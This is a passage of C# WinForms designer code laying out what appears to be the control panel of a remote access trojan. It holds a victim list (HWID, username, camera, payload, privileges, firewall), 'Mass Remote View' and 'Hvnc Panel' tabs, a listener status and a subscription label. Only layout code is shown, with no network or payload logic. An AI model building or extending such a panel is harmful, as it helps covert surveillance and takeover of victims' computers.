            this.guna2VScrollBar4.BindingContainer = this.listView1;
            this.guna2VScrollBar4.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2Transition2.SetDecoration(this.guna2VScrollBar4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2VScrollBar4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.guna2VScrollBar4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.guna2VScrollBar4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2VScrollBar4.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2VScrollBar4.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2VScrollBar4.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2VScrollBar4.HoverState.ThumbColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2VScrollBar4.InUpdate = false;
            this.guna2VScrollBar4.LargeChange = 10;
            this.guna2VScrollBar4.Location = new System.Drawing.Point(1530, 3);
            this.guna2VScrollBar4.Name = "guna2VScrollBar4";
            this.guna2VScrollBar4.PressedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2VScrollBar4.PressedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2VScrollBar4.PressedState.ThumbColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2VScrollBar4.ScrollbarSize = 18;
            this.guna2VScrollBar4.Size = new System.Drawing.Size(18, 724);
            this.guna2VScrollBar4.TabIndex = 22;
            this.guna2VScrollBar4.ThumbColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2VScrollBar4.ThumbStyle = Guna.UI2.WinForms.Enums.ThumbStyle.Inset;
            // 
            // listView1
            // 
            this.listView1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.listView1.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("listView1.BackgroundImage")));
            this.listView1.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.listView1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.lv_ip,
            this.lv_country,
            this.lv_group,
            this.lv_cpugpu,
            this.lv_gpuram,
            this.lv_hwid,
            this.lv_user,
            this.lv_camera,
            this.lv_os,
            this.lv_version,
            this.lv_ins,
            this.lv_admin,
            this.lv_av,
            this.lv_ping,
            this.lv_act,
            this.columnHeader3});
            this.listView1.ContextMenuStrip = this.guna2ContextMenuStrip1;
            this.guna2Transition3.SetDecoration(this.listView1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.listView1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.listView1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.listView1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.listView1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.listView1.Font = new System.Drawing.Font("Electrolize", 8.249999F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.listView1.ForeColor = System.Drawing.Color.WhiteSmoke;
            this.listView1.FullRowSelect = true;
            this.listView1.HideSelection = false;
            this.listView1.Location = new System.Drawing.Point(3, 3);
            this.listView1.Margin = new System.Windows.Forms.Padding(2);
            this.listView1.Name = "listView1";
            this.listView1.OwnerDraw = true;
            this.listView1.ShowGroups = false;
            this.listView1.ShowItemToolTips = true;
            this.listView1.Size = new System.Drawing.Size(1545, 724);
            this.listView1.TabIndex = 7;
            this.listView1.UseCompatibleStateImageBehavior = false;
            this.listView1.View = System.Windows.Forms.View.Details;
            // 
            // lv_ip
            // 
            this.lv_ip.Text = "[DNS/HOST]";
            this.lv_ip.Width = 99;
            // 
            // lv_country
            // 
            this.lv_country.Text = "[GEO]";
            this.lv_country.Width = 93;
            // 
            // lv_group
            // 
            this.lv_group.Text = "[GROUP]";
            this.lv_group.Width = 77;
            // 
            // lv_cpugpu
            // 
            this.lv_cpugpu.Text = "[CPU/GPU]";
            this.lv_cpugpu.Width = 167;
            // 
            // lv_gpuram
            // 
            this.lv_gpuram.Text = "[GPU RAM]";
            // 
            // lv_hwid
            // 
            this.lv_hwid.Text = "[HWID]";
            this.lv_hwid.Width = 101;
            // 
            // lv_user
            // 
            this.lv_user.Text = "[USERNAME]";
            this.lv_user.Width = 106;
            // 
            // lv_camera
            // 
            this.lv_camera.Text = "[CAM PRESENT]";
            this.lv_camera.Width = 106;
            // 
            // lv_os
            // 
            this.lv_os.Text = "[OP SYSTEM]";
            this.lv_os.Width = 91;
            // 
            // lv_version
            // 
            this.lv_version.Text = "[PAYLOAD]";
            this.lv_version.Width = 93;
            // 
            // lv_ins
            // 
            this.lv_ins.Text = "[INSTALLED AT]";
            this.lv_ins.Width = 110;
            // 
            // lv_admin
            // 
            this.lv_admin.Text = "[PRIVILIGES]";
            this.lv_admin.Width = 88;
            // 
            // lv_av
            // 
            this.lv_av.Text = "[PRESENT FIREWALL]";
            this.lv_av.Width = 126;
            // 
            // lv_ping
            // 
            this.lv_ping.Text = "[PING]";
            this.lv_ping.Width = 73;
            // 
            // lv_act
            // 
            this.lv_act.Text = "[ACTIVE NOW]";
            this.lv_act.Width = 103;
            // 
            // columnHeader3
            // 
            this.columnHeader3.Text = "";
            // 
            // guna2Panel2
            // 
            this.guna2Panel2.Controls.Add(this.guna2Separator2);
            this.guna2Panel2.Controls.Add(this.label11);
            this.guna2Panel2.Controls.Add(this.label10);
            this.guna2Panel2.Controls.Add(this.label8);
            this.guna2Panel2.Controls.Add(this.chkSounds);
            this.guna2Panel2.Controls.Add(this.label4);
            this.guna2Panel2.Controls.Add(this.Listener);
            this.guna2Panel2.Controls.Add(this.label3);
            this.guna2Panel2.Controls.Add(this.label2);
            this.guna2Panel2.Controls.Add(this.statusStrip1);
            this.loadForm.SetDecoration(this.guna2Panel2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.guna2Panel2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2Panel2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2Panel2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Panel2.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.guna2Panel2.Location = new System.Drawing.Point(3, 727);
            this.guna2Panel2.Name = "guna2Panel2";
            this.guna2Panel2.Size = new System.Drawing.Size(1545, 23);
            this.guna2Panel2.TabIndex = 20;
            // 
            // guna2Separator2
            // 
            this.guna2Separator2.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2Separator2.BackColor = System.Drawing.Color.Transparent;
            this.loadForm.SetDecoration(this.guna2Separator2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2Separator2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2Separator2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.guna2Separator2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Separator2.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.guna2Separator2.Location = new System.Drawing.Point(-3, -5);
            this.guna2Separator2.Name = "guna2Separator2";
            this.guna2Separator2.Size = new System.Drawing.Size(1555, 10);
            this.guna2Separator2.TabIndex = 151;
            this.guna2Separator2.UseTransparentBackground = true;
            // 
            // label11
            // 
            this.label11.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.label11.AutoSize = true;
            this.loadForm.SetDecoration(this.label11, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.label11, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.label11, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.label11, Guna.UI2.AnimatorNS.DecorationType.None);
            this.label11.Font = new System.Drawing.Font("Electrolize", 8.999999F);
            this.label11.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.label11.Location = new System.Drawing.Point(804, 7);
            this.label11.Name = "label11";
            this.label11.Size = new System.Drawing.Size(44, 15);
            this.label11.TabIndex = 150;
            this.label11.Text = "label11";
            this.guna2HtmlToolTip1.SetToolTip(this.label11, "Your Subscription Status!");
            // 
            // label10
            // 
            this.label10.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.label10.AutoSize = true;
            this.loadForm.SetDecoration(this.label10, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.label10, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.label10, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.label10, Guna.UI2.AnimatorNS.DecorationType.None);
            this.label10.Font = new System.Drawing.Font("Electrolize", 8.999999F);
            this.label10.Location = new System.Drawing.Point(740, 7);
            this.label10.Name = "label10";
            this.label10.Size = new System.Drawing.Size(61, 15);
            this.label10.TabIndex = 149;
            this.label10.Text = "Sub Until:";
            this.guna2HtmlToolTip1.SetToolTip(this.label10, "Your Subscription Status!");
            // 
            // label8
            // 
            this.label8.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.label8.AutoSize = true;
            this.label8.BackColor = System.Drawing.Color.Transparent;
            this.loadForm.SetDecoration(this.label8, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.label8, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.label8, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.label8, Guna.UI2.AnimatorNS.DecorationType.None);
            this.label8.Font = new System.Drawing.Font("Electrolize", 8.999999F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label8.Location = new System.Drawing.Point(969, 7);
            this.label8.Name = "label8";
            this.label8.Size = new System.Drawing.Size(115, 15);
            this.label8.TabIndex = 18;
            this.label8.Text = "Connection Sound :";
            // 
            // chkSounds
            // 
            this.chkSounds.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.chkSounds.BackColor = System.Drawing.Color.Transparent;
            this.chkSounds.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.chkSounds.CheckedState.BorderRadius = 2;
            this.chkSounds.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(32)))), ((int)(((byte)(32)))), ((int)(((byte)(32)))));
            this.chkSounds.CheckedState.InnerBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.chkSounds.CheckedState.InnerBorderRadius = 2;
            this.chkSounds.CheckedState.InnerColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.loadForm.SetDecoration(this.chkSounds, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.chkSounds, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.chkSounds, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.chkSounds, Guna.UI2.AnimatorNS.DecorationType.None);
            this.chkSounds.Location = new System.Drawing.Point(1090, 4);
            this.chkSounds.Name = "chkSounds";
            this.chkSounds.Size = new System.Drawing.Size(55, 20);
            this.chkSounds.TabIndex = 17;
            this.guna2HtmlToolTip1.SetToolTip(this.chkSounds, "Start/Stop Connection Sound!");
            this.chkSounds.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.chkSounds.UncheckedState.BorderRadius = 2;
            this.chkSounds.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(32)))), ((int)(((byte)(32)))), ((int)(((byte)(32)))));
            this.chkSounds.UncheckedState.InnerBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.chkSounds.UncheckedState.InnerBorderRadius = 2;
            this.chkSounds.UncheckedState.InnerColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            // 
            // label4
            // 
            this.label4.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.label4.AutoSize = true;
            this.label4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.loadForm.SetDecoration(this.label4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.label4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.label4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.label4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.label4.Font = new System.Drawing.Font("Electrolize", 8.999999F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label4.Location = new System.Drawing.Point(1166, 7);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(81, 15);
            this.label4.TabIndex = 18;
            this.label4.Text = "Notifications:";
            // 
            // Listener
            // 
            this.Listener.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.Listener.AutoSize = true;
            this.Listener.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.loadForm.SetDecoration(this.Listener, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.Listener, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.Listener, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.Listener, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Listener.Font = new System.Drawing.Font("Electrolize", 8.999999F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Listener.Location = new System.Drawing.Point(1390, 7);
            this.Listener.Name = "Listener";
            this.Listener.Size = new System.Drawing.Size(82, 15);
            this.Listener.TabIndex = 16;
            this.Listener.Text = "Not Listening";
            // 
            // label3
            // 
            this.label3.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.label3.AutoSize = true;
            this.label3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.loadForm.SetDecoration(this.label3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.label3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.label3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.label3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.label3.Font = new System.Drawing.Font("Electrolize", 8.999999F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.label3.Location = new System.Drawing.Point(1247, 7);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(23, 15);
            this.label3.TabIndex = 17;
            this.label3.Text = "On";
            // 
            // label2
            // 
            this.label2.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.label2.AutoSize = true;
            this.label2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.loadForm.SetDecoration(this.label2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.label2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.label2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.label2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.label2.Font = new System.Drawing.Font("Electrolize", 8.999999F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label2.Location = new System.Drawing.Point(1291, 7);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(96, 15);
            this.label2.TabIndex = 15;
            this.label2.Text = "Listener Status:";
            // 
            // statusStrip1
            // 
            this.statusStrip1.BackColor = System.Drawing.Color.Transparent;
            this.guna2Transition2.SetDecoration(this.statusStrip1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.statusStrip1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.statusStrip1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.statusStrip1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.statusStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
            this.statusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripStatusLabel1});
            this.statusStrip1.Location = new System.Drawing.Point(0, 1);
            this.statusStrip1.Name = "statusStrip1";
            this.statusStrip1.Padding = new System.Windows.Forms.Padding(1, 0, 9, 0);
            this.statusStrip1.Size = new System.Drawing.Size(1545, 22);
            this.statusStrip1.SizingGrip = false;
            this.statusStrip1.TabIndex = 14;
            this.statusStrip1.Text = "statusStrip1";
            // 
            // toolStripStatusLabel1
            // 
            this.toolStripStatusLabel1.Font = new System.Drawing.Font("Electrolize", 8.999999F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.toolStripStatusLabel1.Name = "toolStripStatusLabel1";
            this.toolStripStatusLabel1.Size = new System.Drawing.Size(130, 17);
            this.toolStripStatusLabel1.Text = "toolStripStatusLabel1";
            // 
            // tabPage2
            // 
            this.tabPage2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.tabPage2.Controls.Add(this.LISTVIEWTASKS);
            this.guna2Transition1.SetDecoration(this.tabPage2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.tabPage2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.tabPage2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.tabPage2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.tabPage2.Location = new System.Drawing.Point(4, 4);
            this.tabPage2.Name = "tabPage2";
            this.tabPage2.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage2.Size = new System.Drawing.Size(1551, 753);
            this.tabPage2.TabIndex = 1;
            this.tabPage2.Text = "Tasks On Join";
            // 
            // tabPage3
            // 
            this.tabPage3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.tabPage3.Controls.Add(this.listView3);
            this.guna2Transition1.SetDecoration(this.tabPage3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.tabPage3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.tabPage3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.tabPage3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.tabPage3.Location = new System.Drawing.Point(4, 4);
            this.tabPage3.Name = "tabPage3";
            this.tabPage3.Size = new System.Drawing.Size(1551, 753);
            this.tabPage3.TabIndex = 2;
            this.tabPage3.Text = "Mass Remote View";
            // 
            // listView3
            // 
            this.listView3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.listView3.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.listView3.ContextMenuStrip = this.guna2ContextMenuStrip4;
            this.guna2Transition3.SetDecoration(this.listView3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.listView3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.listView3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.listView3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.listView3.Dock = System.Windows.Forms.DockStyle.Fill;
            this.listView3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.listView3.HideSelection = false;
            this.listView3.LargeImageList = this.ThumbnailImageList;
            this.listView3.Location = new System.Drawing.Point(0, 0);
            this.listView3.Margin = new System.Windows.Forms.Padding(2);
            this.listView3.Name = "listView3";
            this.listView3.ShowItemToolTips = true;
            this.listView3.Size = new System.Drawing.Size(1551, 753);
            this.listView3.SmallImageList = this.ThumbnailImageList;
            this.listView3.TabIndex = 1;
            this.listView3.UseCompatibleStateImageBehavior = false;
            // 
            // guna2ContextMenuStrip4
            // 
            this.guna2ContextMenuStrip4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2Transition1.SetDecoration(this.guna2ContextMenuStrip4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2ContextMenuStrip4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.guna2ContextMenuStrip4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.guna2ContextMenuStrip4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2ContextMenuStrip4.Font = new System.Drawing.Font("Century Gothic", 11.25F);
            this.guna2ContextMenuStrip4.ImageScalingSize = new System.Drawing.Size(29, 29);
            this.guna2ContextMenuStrip4.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripMenuItem27,
            this.toolStripMenuItem28});
            this.guna2ContextMenuStrip4.Margin = new System.Windows.Forms.Padding(3);
            this.guna2ContextMenuStrip4.Name = "guna2ContextMenuStrip1";
            this.guna2ContextMenuStrip4.RenderStyle.ArrowColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2ContextMenuStrip4.RenderStyle.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2ContextMenuStrip4.RenderStyle.ColorTable = null;
            this.guna2ContextMenuStrip4.RenderStyle.RoundedEdges = true;
            this.guna2ContextMenuStrip4.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
            this.guna2ContextMenuStrip4.RenderStyle.SelectionBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2ContextMenuStrip4.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
            this.guna2ContextMenuStrip4.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
            this.guna2ContextMenuStrip4.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.SystemDefault;
            this.guna2ContextMenuStrip4.Size = new System.Drawing.Size(148, 76);
            // 
            // toolStripMenuItem27
            // 
            this.toolStripMenuItem27.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem27.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem27.Image")));
            this.toolStripMenuItem27.Name = "toolStripMenuItem27";
            this.toolStripMenuItem27.Size = new System.Drawing.Size(147, 36);
            this.toolStripMenuItem27.Text = "      Start";
            this.toolStripMenuItem27.Click += new System.EventHandler(this.STARTToolStripMenuItem_Click);
            // 
            // toolStripMenuItem28
            // 
            this.toolStripMenuItem28.ForeColor = System.Drawing.Color.LightGray;
            this.toolStripMenuItem28.Image = ((System.Drawing.Image)(resources.GetObject("toolStripMenuItem28.Image")));
            this.toolStripMenuItem28.Name = "toolStripMenuItem28";
            this.toolStripMenuItem28.Size = new System.Drawing.Size(147, 36);
            this.toolStripMenuItem28.Text = "      Stop";
            this.toolStripMenuItem28.Click += new System.EventHandler(this.STOPToolStripMenuItem_Click);
            // 
            // ThumbnailImageList
            // 
            this.ThumbnailImageList.ColorDepth = System.Windows.Forms.ColorDepth.Depth16Bit;
            this.ThumbnailImageList.ImageSize = new System.Drawing.Size(256, 256);
            this.ThumbnailImageList.TransparentColor = System.Drawing.Color.Transparent;
            // 
            // tabPage4
            // 
            this.tabPage4.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.tabPage4.Controls.Add(this.HVNCList);
            this.tabPage4.Controls.Add(this.guna2Panel4);
            this.tabPage4.Controls.Add(this.guna2Panel3);
            this.guna2Transition1.SetDecoration(this.tabPage4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.tabPage4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.tabPage4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.tabPage4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.tabPage4.Location = new System.Drawing.Point(4, 4);
            this.tabPage4.Name = "tabPage4";
            this.tabPage4.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage4.Size = new System.Drawing.Size(1551, 753);
            this.tabPage4.TabIndex = 3;
            this.tabPage4.Text = "Hvnc Panel";
            // 
            // HVNCList
            // 
            this.HVNCList.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.HVNCList.BackgroundImageTiled = true;
            this.HVNCList.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.HVNCList.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.columnHeader6,
            this.columnHeader7,
            this.columnHeader8,
            this.columnHeader9,
            this.columnHeader10,
            this.columnHeader11,
            this.columnHeader12});
            this.guna2Transition3.SetDecoration(this.HVNCList, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.HVNCList, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.HVNCList, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.HVNCList, Guna.UI2.AnimatorNS.DecorationType.None);
            this.HVNCList.Dock = System.Windows.Forms.DockStyle.Fill;
            this.HVNCList.Font = new System.Drawing.Font("Century Gothic", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.HVNCList.ForeColor = System.Drawing.Color.WhiteSmoke;
            this.HVNCList.FullRowSelect = true;
            this.HVNCList.HideSelection = false;
            this.HVNCList.Location = new System.Drawing.Point(3, 3);
            this.HVNCList.Name = "HVNCList";
            this.HVNCList.OwnerDraw = true;
            this.HVNCList.Size = new System.Drawing.Size(1545, 620);
            this.HVNCList.SmallImageList = this.imageList1;
            this.HVNCList.TabIndex = 2;
            this.HVNCList.UseCompatibleStateImageBehavior = false;
            this.HVNCList.View = System.Windows.Forms.View.Details;
            this.HVNCList.DoubleClick += new System.EventHandler(this.HVNCList_DoubleClick);
            // 
            // columnHeader6
            // 
            this.columnHeader6.Text = "Identifier";
            this.columnHeader6.Width = 135;
            // 
            // columnHeader7
            // 
            this.columnHeader7.Text = "IP / DNS";
            this.columnHeader7.Width = 141;
            // 
            // columnHeader8
            // 
            this.columnHeader8.Text = "User@PC";
            this.columnHeader8.Width = 176;
            // 
            // columnHeader9
            // 
            this.columnHeader9.Text = "Country";
            this.columnHeader9.Width = 100;
            // 
            // columnHeader10
            // 
